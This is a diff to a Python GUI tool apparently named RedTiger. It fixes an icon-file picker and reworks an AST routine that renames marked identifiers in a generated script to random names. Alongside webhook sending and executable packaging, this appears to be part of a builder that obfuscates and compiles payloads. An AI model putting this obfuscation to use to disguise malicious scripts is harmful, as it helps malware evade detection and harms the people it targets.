@@ -14,6 +14,7 @@ try:
     import customtkinter as ctk
     from tkinter import messagebox
     import tkinter
+    from tkinter import filedialog
     import os
     import json
     import shutil
@@ -145,9 +146,9 @@ try:
                 root.iconbitmap(os.path.join(tool_path, "Img", "RedTiger_icon.ico"))
                 root.withdraw()
                 root.attributes('-topmost', True)
-                icon_path = tkinter.filedialog.askopenfilename(parent=root, title=f"{name_tool} {version_tool} - Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
+                icon_path = filedialog.askopenfilename(parent=root, title=f"{name_tool} {version_tool} - Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
             elif sys.platform.startswith("linux"):
-                icon_path = tkinter.filedialog.askopenfilename(title=f"{name_tool} {version_tool} - Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
+                icon_path = filedialog.askopenfilename(title=f"{name_tool} {version_tool} - Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
         except:
             pass
         
@@ -456,8 +457,6 @@ try:
                 with open(file_python, 'r', encoding='utf-8') as file:
                     original_script = file.read()
 
-                tree = ast.parse(original_script)
-
                 def visit_node(node):
                     if isinstance(node, ast.Assign):
                         for target in node.targets:
@@ -467,28 +466,30 @@ try:
                                     new_name = RandomName()
                                     variable_map[var_name] = new_name
                                     target.id = new_name
-                                return
 
                     elif isinstance(node, ast.FunctionDef):
-                        for arg in node.args.args:
-                            var_name = arg.arg
-                            if var_name not in variable_map and "v4r_" in var_name:
+                        if "D3f_" in node.name: 
+                            if node.name not in variable_map:
                                 new_name = RandomName()
-                                variable_map[var_name] = new_name
-                                arg.arg = new_name
-                            return
+                                variable_map[node.name] = new_name
+                                node.name = new_name 
+                            for arg in node.args.args:
+                                var_name = arg.arg
+                                if var_name not in variable_map and "v4r_" in var_name:
+                                    new_name = RandomName()
+                                    variable_map[var_name] = new_name
+                                    arg.arg = new_name
 
                     elif isinstance(node, ast.ClassDef):
-                        var_name = node.name
-                        if var_name not in variable_map and "v4r_" in var_name:
+                        if node.name not in variable_map and "v4r_" in node.name:
                             new_name = RandomName()
-                            variable_map[var_name] = new_name
+                            variable_map[node.name] = new_name
                             node.name = new_name
-                        return
-                
+
                     for child in ast.iter_child_nodes(node):
                         visit_node(child)
-                
+
+                tree = ast.parse(original_script)
                 visit_node(tree)
 
                 with open(file_python, 'r', encoding='utf-8') as file:
@@ -501,9 +502,9 @@ try:
                                 line = line.replace(var_name, new_name)
                         file.write(line)
 
+
                 print(f"{BEFORE + current_time_hour() + AFTER} {INFO} All the Identifiers of the python file were obfuscated.")
-            except Exception as e:
-                input(e)
+            except: pass
 
     def SendWebhook(webhook):
         try:
@@ -585,8 +586,7 @@ try:
                     print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Conversion successful.")
             else:
                 print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Conversion successful.")
-        
-            
+
             try:
                 print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Removing temporary files from conversion.. {reset}")     
                 shutil.rmtree(os.path.join(working_directory, "build"))
